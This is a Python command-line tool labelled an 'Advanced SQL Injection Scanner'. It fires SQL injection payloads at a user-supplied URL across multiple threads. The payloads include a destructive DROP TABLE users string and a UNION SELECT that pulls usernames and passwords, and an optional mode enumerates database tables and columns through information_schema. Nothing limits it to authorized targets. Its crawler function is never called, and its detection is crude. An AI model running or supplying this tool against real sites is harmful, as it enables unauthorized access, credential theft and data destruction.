import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import logging
import threading
import time
from queue import Queue
from colorama import Fore, init

# Initialize colorama
init(autoreset=True)

# Set up logging
logger = logging.getLogger()

# Customize logging format
formatter = logging.Formatter('%(asctime)s - %(message)s')
console_handler = logging.StreamHandler()

# Apply color to different log levels
class ColorizedFormatter(logging.Formatter):
    COLORS = {
        'INFO': Fore.GREEN,
        'WARNING': Fore.YELLOW,
        'ERROR': Fore.RED,
        'DEBUG': Fore.CYAN,
        'CRITICAL': Fore.RED + '[ CRITICAL ]' + Fore.RESET
    }

    def format(self, record):
        levelname = record.levelname
        color = self.COLORS.get(levelname, Fore.WHITE)
        record.levelname = f"{color}[{levelname}]{Fore.RESET}"  # Add color to log level
        return super().format(record)

# Set up the console handler to use the colorized formatter
console_handler.setFormatter(ColorizedFormatter('%(levelname)s - %(message)s'))
logger.addHandler(console_handler)
logger.setLevel(logging.INFO)

# HTTP Headers
HEADERS = {
    "User-Agent": "SQLScanBot/2.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
}

# Custom SQLi payloads (expand this list as necessary)
SQLI_PAYLOADS = [
    "' OR 1=1 --",
    "' OR 'a'='a",
    "'; DROP TABLE users --",
    "'; SELECT * FROM information_schema.tables --",
    "' AND 1=2 --",
    "' UNION SELECT null, username, password FROM users --",
    "' AND sleep(5) --",  # Time-based payload
]

# URL Queue and worker threads
url_queue = Queue()
threads = []

# Maximum concurrent threads
MAX_THREADS = 10

# Time delay between requests (to avoid triggering rate limiting or blocking)
REQUEST_DELAY = 1

# Define the basic scanning logic for each URL
def scan_url(url, dbs=False, session=None):
    """
    This function performs a scan on a given URL for SQL injection vulnerabilities.
    :param url: The target URL to test.
    :param dbs: Whether we want to enumerate databases (True) or just check for basic vulnerabilities (False).
    :param session: A persistent session object to reuse connections.
    """
    try:
        logger.info(f"Scanning: {url}")
        
        # Perform the request
        response = session.get(url, headers=HEADERS, timeout=10)
        
        if response.status_code == 200:
            if dbs:
                logger.info("Looking for databases...")
                test_sqli_dbs(url, session)
            else:
                # Search for SQL injection vulnerabilities in the content
                for payload in SQLI_PAYLOADS:
                    test_sqli(url, payload, session)
        else:
            logger.warning(f"Failed to fetch {url} - Status code: {response.status_code}")
    except Exception as e:
        logger.critical(f"Critical error scanning {url}: {str(e)}")

def test_sqli(url, payload, session):
    """
    Test the SQL Injection vulnerability by sending a payload.
    :param url: The target URL to test.
    :param payload: The SQL injection payload.
    :param session: A persistent session object to reuse connections.
    """
    # Ensure the URL is properly concatenated without URL-encoding the payload
    test_url = f"{url}{payload}"
    
    try:
        response = session.get(test_url, headers=HEADERS, timeout=10)
        
        # Look for signs of a SQL injection vulnerability (common error messages)
        if "error" in response.text.lower() or "syntax" in response.text.lower():
            logger.warning(f"Potential SQL Injection found on {url} with payload: {payload}")
        elif "mysql" in response.text.lower() or "syntax error" in response.text.lower():
            logger.warning(f"Possible MySQL SQLi on {url} with payload: {payload}")
    except requests.exceptions.RequestException as e:
        logger.critical(f"Request failed for {url} with payload {payload}: {str(e)}")

def test_sqli_dbs(url, session):
    """
    Test if we can retrieve database information from a vulnerable site.
    :param url: The target URL to test.
    :param session: A persistent session object to reuse connections.
    """
    db_payload = "' UNION SELECT null, null, database() --"
    try:
        response = session.get(f"{url}{db_payload}", headers=HEADERS, timeout=10)
        if "error" not in response.text.lower() and "syntax" not in response.text.lower():
            logger.info(f"Potentially retrieving databases from: {url}")
            # Attempt to retrieve databases or other SQLi information
            retrieve_databases(url, session)
    except requests.exceptions.RequestException as e:
        logger.critical(f"Request failed for {url} with db payload: {str(e)}")

def retrieve_databases(url, session):
    """
    Retrieve databases using SQL injection.
    :param url: The target URL to test.
    :param session: A persistent session object to reuse connections.
    """
    db_enum_payload = "' UNION SELECT null, table_name, column_name FROM information_schema.columns --"
    try:
        response = session.get(f"{url}{db_enum_payload}", headers=HEADERS, timeout=10)
        if "error" not in response.text.lower():
            logger.info(f"Databases retrieved from {url}: {response.text[:200]}")  # Display a portion of the result
    except requests.exceptions.RequestException as e:
        logger.critical(f"Request failed for {url} with enum db payload: {str(e)}")

def parse_and_scan(html, base_url, session, dbs=False):
    """
    Parse the HTML and find links to crawl further.
    :param html: The HTML content of the page.
    :param base_url: The base URL for relative links.
    :param session: A persistent session object to reuse connections.
    :param dbs: Whether we are enumerating databases.
    """
    soup = BeautifulSoup(html, "html.parser")
    links = soup.find_all("a", href=True)

    for link in links:
        href = link["href"]
        full_url = urljoin(base_url, href)
        if urlparse(base_url).netloc == urlparse(full_url).netloc:
            # Skip revisiting the same URLs to prevent cycles
            logger.info(f"Found URL: {full_url}")
            url_queue.put((full_url, dbs))

def worker():
    """
    Worker thread to scan URLs from the queue.
    """
    session = requests.Session()
    while not url_queue.empty():
        url, dbs = url_queue.get()
        scan_url(url, dbs, session)
        time.sleep(REQUEST_DELAY)  # Sleep to avoid rate limiting

def start_scanning(base_url, dbs=False):
    """
    Start scanning from the base URL with threading.
    :param base_url: The base URL to start scanning.
    :param dbs: Whether to look for databases.
    """
    session = requests.Session()

    # Start with the base URL
    url_queue.put((base_url, dbs))

    # Create and start worker threads
    for i in range(MAX_THREADS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)

    # Wait for all threads to complete
    for t in threads:
        t.join()

def main():
    """
    Main entry point for the script.
    """
    import argparse

    parser = argparse.ArgumentParser(description="Advanced SQL Injection Scanner")
    parser.add_argument("-u", "--url", help="Target URL to scan", required=True)
    parser.add_argument("-dbs", "--databases", help="Enumerate SQL databases (default: False)", action="store_true")
    args = parser.parse_args()

    logger.info(f"Starting SQL Injection scan on {args.url}...")

    # Start the scanning process
    start_scanning(args.url, args.databases)

if __name__ == "__main__":
    main()
